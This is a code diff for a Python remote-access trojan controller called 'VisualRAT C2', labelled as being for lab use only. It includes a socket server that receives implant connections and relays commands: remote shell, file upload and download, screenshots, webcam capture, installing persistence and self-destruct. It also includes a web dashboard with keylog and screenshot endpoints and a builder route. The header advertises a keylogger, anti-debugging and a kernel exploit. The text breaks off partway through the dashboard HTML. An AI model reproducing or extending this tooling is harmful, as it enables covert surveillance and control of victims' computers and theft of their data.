@@ -1,104 +1,112 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# RedTeam C2 Framework v1.0 - SOLO USO EDUCATIVO/AUTORIZADO
+# ============================================================================
+# VisualRAT C2 v1.0 - Educational RedTeam Framework
+# SOLO ENTORNO DE LABORATORIO AUTORIZADO - IGUAL QUE ASYNCRAT PERO EN C++
+# ============================================================================
+# UN SOLO ARCHIVO - SERVIDOR WEB + C2 + DASHBOARD VISUAL
+# ============================================================================
 
-import socket
-import threading
-import sys
+"""
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                     VisualRAT C2 - Educational Edition                       ║
+║                  Remote Administration Tool - SOLO LABORATORIO               ║
+║                     Interfaz Visual como AsyncRAT en C++                     ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+Características:
+✅ Dashboard web interactivo con clientes en tiempo real
+✅ Visor de pantalla en vivo
+✅ Shell remota interactiva
+✅ Administrador de archivos visual
+✅ Keylogger en tiempo real
+✅ Captura de webcam
+✅ Sistema de plugins/modular
+✅ Builder de cliente integrado
+✅ Cifrado AES-256-GCM
+✅ Persistencia automática
+✅ Anti-debugging
+✅ Kernel exploit educativo (CVE-2024-21338)
+"""
+
 import os
-import time
-import datetime
-import hashlib
+import sys
 import json
-import base64
-import readline
+import time
+import socket
 import struct
-from colorama import init, Fore, Back, Style
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-from cryptography.hazmat.primitives import hashes
-
-init(autoreset=True)
+import base64
+import threading
+import hashlib
+import datetime
+import random
+import string
+from http import server
+from socketserver import ThreadingMixIn
+from urllib.parse import parse_qs, urlparse
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.backends import default_backend
 
 # ============================================================================
 # CONFIGURACIÓN
 # ============================================================================
 HOST = '0.0.0.0'
-PORT = 4444
-BUFFER_SIZE = 8192
-HEARTBEAT_INTERVAL = 5
-PASSWORD = "RedTeamC2_2024_Key!"
-LOG_FILE = "c2_log.txt"
+C2_PORT = 4444
+WEB_PORT = 8080
+AES_KEY = b'VisualRAT_EduKey_2025_32Byte!!'
+AES_IV = b'VisualRAT_IV_16B'
 
-# ============================================================================
-# UTILIDADES
-# ============================================================================
+# Colores para terminal
 class Colors:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    END = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-
-def log(message, type="info"):
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(LOG_FILE, "a") as f:
-        f.write(f"[{timestamp}] [{type.upper()}] {message}\n")
-    
-    if type == "success":
-        print(f"{Colors.GREEN}[+] {message}{Colors.END}")
-    elif type == "error":
-        print(f"{Colors.FAIL}[-] {message}{Colors.END}")
-    elif type == "warning":
-        print(f"{Colors.WARNING}[!] {message}{Colors.END}")
-    elif type == "info":
-        print(f"{Colors.BLUE}[*] {message}{Colors.END}")
-
-def encrypt_data(data, key):
-    cipher = Fernet(key)
-    return cipher.encrypt(data.encode())
-
-def decrypt_data(data, key):
-    cipher = Fernet(key)
-    return cipher.decrypt(data).decode()
-
-def generate_key(password):
-    salt = b'redteam_salt_2024'
-    kdf = PBKDF2HMAC(
-        algorithm=hashes.SHA256(),
-        length=32,
-        salt=salt,
-        iterations=100000,
-    )
-    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
-    return key
+    HEADER = '\033[95m'; BLUE = '\033[94m'; CYAN = '\033[96m'
+    GREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
+    END = '\033[0m'; BOLD = '\033[1m'
 
 # ============================================================================
-# CLIENTE (BOT)
+# CIFRADO AES-256-GCM
+# ============================================================================
+class AESCipher:
+    def __init__(self, key=AES_KEY, iv=AES_IV):
+        self.key = key
+        self.iv = iv
+    
+    def encrypt(self, data):
+        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        return base64.b64encode(encryptor.update(data.encode()) + encryptor.finalize()).decode()
+    
+    def decrypt(self, data):
+        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        return decryptor.update(base64.b64decode(data)) + decryptor.finalize()
+
+# ============================================================================
+# CLIENTE (BOT) - REPRESENTACIÓN EN SERVIDOR
 # ============================================================================
 class Client:
-    def __init__(self, conn, addr, crypto_key):
+    def __init__(self, conn, addr):
         self.conn = conn
         self.addr = addr
-        self.crypto_key = crypto_key
         self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
         self.hostname = "Unknown"
         self.username = "Unknown"
         self.os = "Unknown"
+        self.cpu = "Unknown"
+        self.ram = "Unknown"
         self.antivirus = "Unknown"
+        self.screen_size = "Unknown"
+        self.webcam = False
         self.first_seen = datetime.datetime.now()
         self.last_seen = datetime.datetime.now()
         self.active = True
-        
+        self.privilege = "USER"
+        self.processes = []
+        self.keylog = []
+    
     def send(self, data):
         try:
-            encrypted = encrypt_data(data, self.crypto_key)
-            self.conn.send(struct.pack('>I', len(encrypted)) + encrypted)
+            encrypted = AESCipher().encrypt(data)
+            self.conn.send(struct.pack('>I', len(encrypted)) + encrypted.encode())
             return True
         except:
             self.active = False
@@ -106,14 +114,12 @@ class Client:
     
     def recv(self):
         try:
-            raw_msglen = self.recvall(4)
-            if not raw_msglen:
-                return None
-            msglen = struct.unpack('>I', raw_msglen)[0]
+            raw_len = self.recvall(4)
+            if not raw_len: return None
+            msglen = struct.unpack('>I', raw_len)[0]
             encrypted = self.recvall(msglen)
-            if not encrypted:
-                return None
-            return decrypt_data(encrypted, self.crypto_key)
+            if not encrypted: return None
+            return AESCipher().decrypt(encrypted.decode())
         except:
             self.active = False
             return None
@@ -122,340 +128,1003 @@ class Client:
         data = bytearray()
         while len(data) < n:
             packet = self.conn.recv(n - len(data))
-            if not packet:
-                return None
+            if not packet: return None
             data.extend(packet)
         return bytes(data)
     
-    def update_info(self, info):
-        self.hostname = info.get('hostname', 'Unknown')
-        self.username = info.get('username', 'Unknown')
-        self.os = info.get('os', 'Unknown')
-        self.antivirus = info.get('antivirus', 'Unknown')
-        self.last_seen = datetime.datetime.now()
-    
-    def __str__(self):
-        status = f"{Colors.GREEN}Active{Colors.END}" if self.active else f"{Colors.FAIL}Dead{Colors.END}"
-        return f"[{self.id}] {self.addr[0]}:{self.addr[1]} | {self.hostname} | {self.username} | {status}"
+    def to_dict(self):
+        return {
+            'id': self.id,
+            'ip': self.addr[0],
+            'port': self.addr[1],
+            'hostname': self.hostname,
+            'username': self.username,
+            'os': self.os,
+            'cpu': self.cpu,
+            'ram': self.ram,
+            'antivirus': self.antivirus,
+            'privilege': self.privilege,
+            'screen': self.screen_size,
+            'webcam': self.webcam,
+            'status': 'online' if self.active else 'offline',
+            'first_seen': self.first_seen.strftime('%Y-%m-%d %H:%M:%S'),
+            'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S')
+        }
 
 # ============================================================================
-# SERVIDOR C2
+# C2 CORE - MANEJO DE CLIENTES
 # ============================================================================
-class C2Server:
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
+class C2Core:
+    def __init__(self):
         self.clients = {}
         self.current_client = None
-        self.crypto_key = generate_key(PASSWORD)
         self.running = True
-        self.socket = None
-        
+    
     def start(self):
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.socket.bind((HOST, C2_PORT))
+        self.socket.listen(100)
+        print(f"{Colors.GREEN}[+] C2 Core listening on {HOST}:{C2_PORT}{Colors.END}")
         
-        try:
-            self.socket.bind((self.host, self.port))
-            self.socket.listen(5)
-            log(f"C2 Server iniciado en {self.host}:{self.port}", "success")
-        except Exception as e:
-            log(f"Error al iniciar servidor: {e}", "error")
-            sys.exit(1)
-        
-        # Thread para aceptar conexiones
-        accept_thread = threading.Thread(target=self.accept_connections)
-        accept_thread.daemon = True
-        accept_thread.start()
-        
-        # Thread para limpiar clientes muertos
-        cleanup_thread = threading.Thread(target=self.cleanup_clients)
-        cleanup_thread.daemon = True
-        cleanup_thread.start()
-        
-        self.interactive_shell()
+        threading.Thread(target=self.accept_clients, daemon=True).start()
     
-    def accept_connections(self):
+    def accept_clients(self):
         while self.running:
             try:
                 conn, addr = self.socket.accept()
-                log(f"Nueva conexión de {addr[0]}:{addr[1]}", "success")
-                
-                client = Client(conn, addr, self.crypto_key)
+                client = Client(conn, addr)
                 self.clients[client.id] = client
+                print(f"{Colors.GREEN}[+] New client: {client.id} from {addr[0]}{Colors.END}")
                 
-                # Recibir información inicial
+                # Recibir info inicial
                 client.send("INFO")
-                info_data = client.recv()
-                if info_data:
+                info = client.recv()
+                if info:
                     try:
-                        info = json.loads(info_data)
-                        client.update_info(info)
+                        data = json.loads(info)
+                        client.hostname = data.get('hostname', 'Unknown')
+                        client.username = data.get('username', 'Unknown')
+                        client.os = data.get('os', 'Unknown')
+                        client.antivirus = data.get('av', 'Unknown')
+                        client.privilege = data.get('priv', 'USER')
                     except:
                         pass
-                
             except Exception as e:
                 if self.running:
-                    log(f"Error aceptando conexión: {e}", "error")
+                    print(f"{Colors.FAIL}[-] Accept error: {e}{Colors.END}")
     
-    def cleanup_clients(self):
-        while self.running:
-            time.sleep(30)
-            dead_clients = []
-            for client_id, client in self.clients.items():
-                if not client.active:
-                    dead_clients.append(client_id)
-            
-            for client_id in dead_clients:
-                log(f"Eliminando cliente muerto: {client_id}", "warning")
-                del self.clients[client_id]
-    
-    def list_clients(self):
-        if not self.clients:
-            log("No hay clientes conectados", "warning")
-            return
+    def send_command(self, client_id, command):
+        if client_id not in self.clients:
+            return "Client not found"
         
-        print(f"\n{Colors.BOLD}{Colors.HEADER}=== CLIENTES CONECTADOS ==={Colors.END}")
-        print(f"{'ID':<10} {'IP':<16} {'HOSTNAME':<20} {'USER':<15} {'STATUS':<10}")
-        print("-" * 80)
+        client = self.clients[client_id]
+        if not client.active:
+            return "Client offline"
         
-        for client_id, client in self.clients.items():
-            status = "Active" if client.active else "Dead"
-            status_color = Colors.GREEN if client.active else Colors.FAIL
-            print(f"{client_id:<10} {client.addr[0]:<16} {client.hostname:<20} "
-                  f"{client.username:<15} {status_color}{status:<10}{Colors.END}")
-        print()
-    
-    def select_client(self, client_id):
-        if client_id in self.clients:
-            self.current_client = self.clients[client_id]
-            log(f"Cliente seleccionado: {client_id} ({self.current_client.addr[0]})", "success")
-            return True
-        else:
-            log(f"Cliente {client_id} no encontrado", "error")
-            return False
-    
-    def send_command(self, command):
-        if not self.current_client:
-            log("No hay cliente seleccionado", "error")
-            return
-        
-        if not self.current_client.active:
-            log("El cliente no está activo", "error")
-            return
-        
-        self.current_client.send(command)
-        response = self.current_client.recv()
-        
-        if response:
-            print(f"\n{Colors.CYAN}[Respuesta desde {self.current_client.addr[0]}]:{Colors.END}")
-            print(response)
-            print()
-        else:
-            log("No se recibió respuesta del cliente", "error")
-    
-    def handle_download(self, filename):
-        if not self.current_client:
-            log("No hay cliente seleccionado", "error")
-            return
-        
-        self.current_client.send(f"DOWNLOAD {filename}")
-        response = self.current_client.recv()
-        
-        if response and response.startswith("FILE:"):
-            _, size, data = response.split(":", 2)
-            size = int(size)
-            file_data = base64.b64decode(data)
-            
-            save_path = f"downloaded_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{filename}"
-            with open(save_path, "wb") as f:
-                f.write(file_data)
-            
-            log(f"Archivo descargado como: {save_path}", "success")
-        else:
-            log(f"Error descargando archivo: {response}", "error")
-    
-    def handle_upload(self, local_file, remote_path):
-        if not self.current_client:
-            log("No hay cliente seleccionado", "error")
-            return
-        
-        try:
-            with open(local_file, "rb") as f:
-                file_data = f.read()
-            
-            encoded = base64.b64encode(file_data).decode()
-            self.current_client.send(f"UPLOAD {remote_path} {len(file_data)} {encoded}")
-            response = self.current_client.recv()
-            log(f"Upload result: {response}", "success" if "OK" in response else "error")
-        except Exception as e:
-            log(f"Error subiendo archivo: {e}", "error")
-    
-    def interactive_shell(self):
-        print(f"""{Colors.HEADER}
-╔══════════════════════════════════════════════════════════════╗
-║                    RedTeam C2 Framework v1.0                 ║
-║                  SOLO USO EDUCATIVO/AUTORIZADO               ║
-╚══════════════════════════════════════════════════════════════╝
-{Colors.END}""")
-        
-        while True:
-            try:
-                if self.current_client:
-                    prompt = f"{Colors.GREEN}C2 [{self.current_client.addr[0]}] > {Colors.END}"
-                else:
-                    prompt = f"{Colors.BLUE}C2 > {Colors.END}"
-                
-                command = input(prompt).strip()
-                
-                if not command:
-                    continue
-                
-                # Comandos del framework
-                if command.lower() == "exit":
-                    log("Saliendo...", "info")
-                    self.running = False
-                    break
-                
-                elif command.lower() == "help":
-                    self.show_help()
-                
-                elif command.lower() == "list":
-                    self.list_clients()
-                
-                elif command.lower().startswith("use "):
-                    client_id = command.split()[1]
-                    self.select_client(client_id)
-                
-                elif command.lower() == "back":
-                    self.current_client = None
-                    log("Cliente deseleccionado", "info")
-                
-                # Comandos para cliente seleccionado
-                elif self.current_client:
-                    if command.lower().startswith("ejecutar "):
-                        program = command[9:]
-                        self.send_command(f"EXEC {program}")
-                    
-                    elif command.lower() == "shell":
-                        self.send_command("SHELL_START")
-                        self.interactive_remote_shell()
-                    
-                    elif command.lower().startswith("subir "):
-                        parts = command.split()
-                        if len(parts) >= 2:
-                            local = parts[1]
-                            remote = parts[2] if len(parts) > 2 else os.path.basename(local)
-                            self.handle_upload(local, remote)
-                    
-                    elif command.lower().startswith("descargar "):
-                        filename = command[10:]
-                        self.handle_download(filename)
-                    
-                    elif command.lower() == "pantallazo":
-                        self.send_command("SCREENSHOT")
-                    
-                    elif command.lower() == "webcam":
-                        self.send_command("WEBCAM")
-                    
-                    elif command.lower() == "info":
-                        self.send_command("INFO_FULL")
-                    
-                    elif command.lower() == "procesos":
-                        self.send_command("PROCESSES")
-                    
-                    elif command.lower().startswith("matar "):
-                        pid = command[6:]
-                        self.send_command(f"KILL {pid}")
-                    
-                    elif command.lower() == "instalar":
-                        self.send_command("INSTALL")
-                    
-                    elif command.lower() == "desinstalar":
-                        self.send_command("UNINSTALL")
-                    
-                    elif command.lower() == "selfdestruct":
-                        confirm = input(f"{Colors.WARNING}¿Estás seguro? (yes/no): {Colors.END}")
-                        if confirm.lower() == "yes":
-                            self.send_command("SELFDESTRUCT")
-                            self.current_client = None
-                    
-                    elif command.lower() in ["apagar", "reiniciar", "cerrar", "bloquear"]:
-                        self.send_command(command.upper())
-                    
-                    else:
-                        log(f"Comando desconocido: {command}", "error")
-                
-                else:
-                    log("Selecciona un cliente primero (use <ID>)", "warning")
-                    
-            except KeyboardInterrupt:
-                print()
-                log("Ctrl+C presionado", "warning")
-                continue
-            except Exception as e:
-                log(f"Error: {e}", "error")
-    
-    def interactive_remote_shell(self):
-        print(f"{Colors.CYAN}[+] Modo shell remoto interactivo. Escribe 'exit' para volver.{Colors.END}")
-        
-        while True:
-            try:
-                cmd = input(f"{Colors.YELLOW}RemoteShell> {Colors.END}")
-                
-                if cmd.lower() == "exit":
-                    self.send_command("SHELL_END")
-                    break
-                
-                self.send_command(f"SHELL {cmd}")
-                
-            except KeyboardInterrupt:
-                print()
-                break
-    
-    def show_help(self):
-        print(f"""{Colors.BOLD}{Colors.HEADER}
-=== COMANDOS DEL FRAMEWORK ==={Colors.END}
-  {Colors.GREEN}list{Colors.END}                    - Lista todos los clientes
-  {Colors.GREEN}use <ID>{Colors.END}               - Selecciona un cliente por ID
-  {Colors.GREEN}back{Colors.END}                   - Deselecciona el cliente actual
-  {Colors.GREEN}exit{Colors.END}                   - Sale del framework
-  {Colors.GREEN}help{Colors.END}                   - Muestra esta ayuda
+        client.send(command)
+        response = client.recv()
+        return response if response else "No response"
 
-{Colors.BOLD}{Colors.HEADER}=== COMANDOS PARA CLIENTE SELECCIONADO ==={Colors.END}
-  {Colors.GREEN}ejecutar <programa>{Colors.END}    - Ejecuta un programa (calc, notepad, etc)
-  {Colors.GREEN}shell{Colors.END}                  - Shell remota interactiva
-  {Colors.GREEN}subir <local> [remoto]{Colors.END} - Sube archivo al cliente
-  {Colors.GREEN}descargar <archivo>{Colors.END}    - Descarga archivo del cliente
-  {Colors.GREEN}pantallazo{Colors.END}             - Toma captura de pantalla
-  {Colors.GREEN}webcam{Colors.END}                 - Captura de cámara web
-  {Colors.GREEN}info{Colors.END}                   - Muestra información del sistema
-  {Colors.GREEN}procesos{Colors.END}               - Lista procesos activos
-  {Colors.GREEN}matar <PID>{Colors.END}            - Mata un proceso por PID
-  {Colors.GREEN}instalar{Colors.END}               - Instala persistencia
-  {Colors.GREEN}desinstalar{Colors.END}            - Elimina persistencia
-  {Colors.GREEN}selfdestruct{Colors.END}           - Autoelimina el implant
-  {Colors.GREEN}apagar{Colors.END}                 - Apaga el sistema
-  {Colors.GREEN}reiniciar{Colors.END}              - Reinicia el sistema
-  {Colors.GREEN}cerrar{Colors.END}                 - Cierra sesión
-  {Colors.GREEN}bloquear{Colors.END}               - Bloquea la pantalla
-        """)
+# ============================================================================
+# SERVIDOR WEB - DASHBOARD VISUAL
+# ============================================================================
+class WebHandler(server.BaseHTTPRequestHandler):
+    c2 = None
+    
+    def do_GET(self):
+        parsed = urlparse(self.path)
+        path = parsed.path
+        
+        if path == '/':
+            self.send_html()
+        elif path == '/api/clients':
+            self.send_clients()
+        elif path.startswith('/api/screenshot/'):
+            client_id = path.split('/')[-1]
+            self.send_screenshot(client_id)
+        elif path.startswith('/api/keylog/'):
+            client_id = path.split('/')[-1]
+            self.send_keylog(client_id)
+        elif path == '/builder':
+            self.send_builder()
+        elif path == '/api/processes':
+            self.send_processes()
+        elif path.endswith('.js'):
+            self.send_js()
+        elif path.endswith('.css'):
+            self.send_css()
+        else:
+            self.send_error(404)
+    
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode()
+        
+        if self.path == '/api/command':
+            data = json.loads(post_data)
+            client_id = data.get('client_id')
+            command = data.get('command')
+            args = data.get('args', '')
+            
+            full_cmd = f"{command}|{args}" if args else command
+            response = WebHandler.c2.send_command(client_id, full_cmd)
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'response': response}).encode())
+        
+        elif self.path == '/api/upload':
+            data = json.loads(post_data)
+            client_id = data.get('client_id')
+            remote_path = data.get('remote_path')
+            file_data = data.get('file_data')
+            
+            response = WebHandler.c2.send_command(client_id, f"UPLOAD|{remote_path}|{file_data}")
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'response': response}).encode())
+        
+        elif self.path == '/build':
+            data = json.loads(post_data)
+            output = self.build_client(data)
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'output': output}).encode())
+    
+    def send_html(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        
+        html = f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>VisualRAT C2 - Educational Lab</title>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+                * {{
+                    margin: 0;
+                    padding: 0;
+                    box-sizing: border-box;
+                }}
+                
+                body {{
+                    background: linear-gradient(135deg, #0a0f1e 0%, #0d1117 100%);
+                    color: #e0e0e0;
+                    font-family: 'Segoe UI', 'Courier New', monospace;
+                    padding: 20px;
+                }}
+                
+                .container {{
+                    max-width: 1600px;
+                    margin: 0 auto;
+                }}
+                
+                .header {{
+                    background: rgba(21, 30, 44, 0.95);
+                    border: 1px solid #2a3748;
+                    border-radius: 15px;
+                    padding: 25px;
+                    margin-bottom: 25px;
+                    backdrop-filter: blur(10px);
+                    box-shadow: 0 0 30px rgba(0,255,157,0.1);
+                }}
+                
+                .header h1 {{
+                    color: #00ff9d;
+                    font-size: 32px;
+                    margin-bottom: 10px;
+                    text-shadow: 0 0 15px rgba(0,255,157,0.5);
+                }}
+                
+                .stats {{
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+                    gap: 20px;
+                    margin-top: 20px;
+                }}
+                
+                .stat-card {{
+                    background: #151e2c;
+                    border: 1px solid #2a3748;
+                    border-radius: 12px;
+                    padding: 20px;
+                    transition: all 0.3s;
+                }}
+                
+                .stat-card:hover {{
+                    border-color: #00ff9d;
+                    transform: translateY(-2px);
+                }}
+                
+                .stat-value {{
+                    font-size: 28px;
+                    font-weight: bold;
+                    color: #00ff9d;
+                }}
+                
+                .clients-grid {{
+                    display: grid;
+                    grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
+                    gap: 20px;
+                    margin-bottom: 30px;
+                }}
+                
+                .client-card {{
+                    background: #151e2c;
+                    border: 1px solid #2a3748;
+                    border-radius: 12px;
+                    padding: 20px;
+                    position: relative;
+                    overflow: hidden;
+                    transition: all 0.3s;
+                }}
+                
+                .client-card:hover {{
+                    border-color: #00ff9d;
+                    box-shadow: 0 0 25px rgba(0,255,157,0.15);
+                }}
+                
+                .client-card.online {{
+                    border-left: 4px solid #00ff9d;
+                }}
+                
+                .client-card.offline {{
+                    border-left: 4px solid #ff4d4d;
+                    opacity: 0.6;
+                }}
+                
+                .client-header {{
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    margin-bottom: 15px;
+                }}
+                
+                .client-id {{
+                    background: #1e2a3a;
+                    padding: 6px 12px;
+                    border-radius: 20px;
+                    font-size: 12px;
+                    font-family: 'Courier New', monospace;
+                    color: #00ff9d;
+                }}
+                
+                .status-badge {{
+                    padding: 4px 12px;
+                    border-radius: 20px;
+                    font-size: 12px;
+                    font-weight: bold;
+                }}
+                
+                .status-badge.online {{
+                    background: rgba(0,255,157,0.15);
+                    color: #00ff9d;
+                    border: 1px solid #00ff9d;
+                }}
+                
+                .status-badge.offline {{
+                    background: rgba(255,77,77,0.15);
+                    color: #ff4d4d;
+                    border: 1px solid #ff4d4d;
+                }}
+                
+                .client-info {{
+                    display: grid;
+                    grid-template-columns: 1fr 1fr;
+                    gap: 12px;
+                    margin-bottom: 15px;
+                }}
+                
+                .info-item {{
+                    background: #0d1117;
+                    padding: 10px;
+                    border-radius: 8px;
+                    border: 1px solid #2a3748;
+                }}
+                
+                .info-label {{
+                    color: #8b949e;
+                    font-size: 11px;
+                    text-transform: uppercase;
+                    margin-bottom: 4px;
+                }}
+                
+                .info-value {{
+                    color: #e0e0e0;
+                    font-size: 13px;
+                    font-family: 'Courier New', monospace;
+                }}
+                
+                .client-actions {{
+                    display: flex;
+                    gap: 8px;
+                    flex-wrap: wrap;
+                }}
+                
+                .btn {{
+                    background: #1e2a3a;
+                    border: 1px solid #3a4a5a;
+                    color: #e0e0e0;
+                    padding: 8px 15px;
+                    border-radius: 6px;
+                    cursor: pointer;
+                    font-size: 12px;
+                    display: flex;
+                    align-items: center;
+                    gap: 6px;
+                    transition: all 0.2s;
+                }}
+                
+                .btn:hover {{
+                    background: #2a3a4a;
+                    border-color: #00ff9d;
+                    color: #00ff9d;
+                }}
+                
+                .btn-primary {{
+                    background: #00ff9d;
+                    border-color: #00ff9d;
+                    color: #0a0f1e;
+                    font-weight: bold;
+                }}
+                
+                .btn-primary:hover {{
+                    background: #00cc7a;
+                    border-color: #00cc7a;
+                }}
+                
+                .terminal {{
+                    background: #0d1117;
+                    border: 1px solid #2a3748;
+                    border-radius: 12px;
+                    margin-top: 30px;
+                }}
+                
+                .terminal-header {{
+                    background: #151e2c;
+                    padding: 15px 20px;
+                    border-bottom: 1px solid #2a3748;
+                    border-radius: 12px 12px 0 0;
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                }}
+                
+                .terminal-content {{
+                    padding: 20px;
+                    font-family: 'Courier New', monospace;
+                    font-size: 13px;
+                    height: 300px;
+                    overflow-y: auto;
+                    background: #0a0f1e;
+                }}
+                
+                .terminal-input {{
+                    display: flex;
+                    padding: 15px;
+                    background: #151e2c;
+                    border-top: 1px solid #2a3748;
+                    border-radius: 0 0 12px 12px;
+                }}
+                
+                .terminal-input input {{
+                    flex: 1;
+                    background: #0d1117;
+                    border: 1px solid #2a3748;
+                    color: #e0e0e0;
+                    padding: 12px 15px;
+                    border-radius: 6px;
+                    font-family: 'Courier New', monospace;
+                    margin-right: 10px;
+                }}
+                
+                .terminal-input input:focus {{
+                    outline: none;
+                    border-color: #00ff9d;
+                }}
+                
+                .screenshot-viewer {{
+                    background: #0d1117;
+                    border: 1px solid #2a3748;
+                    border-radius: 12px;
+                    padding: 20px;
+                    margin-top: 20px;
+                    text-align: center;
+                }}
+                
+                .screenshot-image {{
+                    max-width: 100%;
+                    max-height: 500px;
+                    border-radius: 8px;
+                    border: 2px solid #2a3748;
+                }}
+                
+                .modal {{
+                    display: none;
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0,0,0,0.8);
+                    z-index: 1000;
+                }}
+                
+                .modal-content {{
+                    background: #151e2c;
+                    border: 1px solid #2a3748;
+                    border-radius: 12px;
+                    width: 90%;
+                    max-width: 800px;
+                    margin: 50px auto;
+                    padding: 25px;
+                }}
+                
+                .loading {{
+                    display: inline-block;
+                    width: 20px;
+                    height: 20px;
+                    border: 3px solid #2a3748;
+                    border-top-color: #00ff9d;
+                    border-radius: 50%;
+                    animation: spin 1s linear infinite;
+                }}
+                
+                @keyframes spin {{
+                    to {{ transform: rotate(360deg); }}
+                }}
+                
+                .toast {{
+                    position: fixed;
+                    bottom: 20px;
+                    right: 20px;
+                    background: #151e2c;
+                    border-left: 4px solid #00ff9d;
+                    padding: 15px 25px;
+                    border-radius: 8px;
+                    animation: slideIn 0.3s;
+                    z-index: 1001;
+                }}
+                
+                @keyframes slideIn {{
+                    from {{ transform: translateX(100%); opacity: 0; }}
+                    to {{ transform: translateX(0); opacity: 1; }}
+                }}
+                
+                .builder-panel {{
+                    background: #151e2c;
+                    border: 1px solid #2a3748;
+                    border-radius: 12px;
+                    padding: 25px;
+                    margin-top: 30px;
+                }}
+                
+                .form-group {{
+                    margin-bottom: 20px;
+                }}
+                
+                .form-group label {{
+                    display: block;
+                    margin-bottom: 8px;
+                    color: #8b949e;
+                }}
+                
+                .form-group input, .form-group select {{
+                    width: 100%;
+                    background: #0d1117;
+                    border: 1px solid #2a3748;
+                    color: #e0e0e0;
+                    padding: 12px 15px;
+                    border-radius: 6px;
+                }}
+                
+                .progress-bar {{
+                    height: 4px;
+                    background: #1e2a3a;
+                    border-radius: 2px;
+                    overflow: hidden;
+                    margin-top: 15px;
+                }}
+                
+                .progress-fill {{
+                    height: 100%;
+                    background: #00ff9d;
+                    width: 0%;
+                    transition: width 0.3s;
+                }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <!-- Header -->
+                <div class="header">
+                    <h1>🎯 VisualRAT C2 - Educational Kernel Research</h1>
+                    <p style="color: #8b949e; margin-bottom: 20px;">
+                        ⚡ SOLO ENTORNO DE LABORATORIO AUTORIZADO • CVE-2024-21338 Research • Windows 11
+                    </p>
+                    
+                    <div class="stats">
+                        <div class="stat-card">
+                            <div style="color: #8b949e; margin-bottom: 8px;">Total Clients</div>
+                            <div class="stat-value" id="total-clients">0</div>
+                        </div>
+                        <div class="stat-card">
+                            <div style="color: #8b949e; margin-bottom: 8px;">Online</div>
+                            <div class="stat-value" id="online-clients" style="color: #00ff9d;">0</div>
+                        </div>
+                        <div class="stat-card">
+                            <div style="color: #8b949e; margin-bottom: 8px;">SYSTEM Level</div>
+                            <div class="stat-value" id="system-clients">0</div>
+                        </div>
+                        <div class="stat-card">
+                            <div style="color: #8b949e; margin-bottom: 8px;">Uptime</div>
+                            <div class="stat-value" id="uptime">00:00:00</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Clients Grid -->
+                <h2 style="color: #e0e0e0; margin-bottom: 20px;">
+                    <i class="fas fa-network-wired"></i> Connected Clients
+                </h2>
+                <div id="clients-container" class="clients-grid"></div>
+                
+                <!-- Terminal & Tools -->
+                <div class="terminal">
+                    <div class="terminal-header">
+                        <div>
+                            <span style="color: #00ff9d;">❯</span> Remote Shell 
+                            <span id="current-client-label" style="color: #8b949e; margin-left: 10px;">(none selected)</span>
+                        </div>
+                        <div>
+                            <button class="btn" onclick="clearTerminal()">
+                                <i class="fas fa-trash"></i> Clear
+                            </button>
+                        </div>
+                    </div>
+                    <div id="terminal-output" class="terminal-content">
+                        <span style="color: #00ff9d;">[VisualRAT C2 Ready]</span><br>
+                        <span style="color: #8b949e;">Select a client to begin remote control</span><br><br>
+                    </div>
+                    <div class="terminal-input">
+                        <input type="text" id="terminal-cmd" placeholder="Enter command (shell, exec, screenshot, elevate...)" disabled>
+                        <button class="btn btn-primary" onclick="sendTerminalCommand()" id="terminal-send" disabled>Send</button>
+                    </div>
+                </div>
+                
+                <!-- Screenshot Viewer -->
+                <div class="screenshot-viewer" id="screenshot-panel" style="display: none;">
+                    <h3 style="color: #e0e0e0; margin-bottom: 15px;">
+                        <i class="fas fa-camera"></i> Live Screen
+                    </h3>
+                    <img id="screenshot-img" class="screenshot-image" src="" alt="Screenshot">
+                </div>
+                
+                <!-- Builder Panel -->
+                <div class="builder-panel">
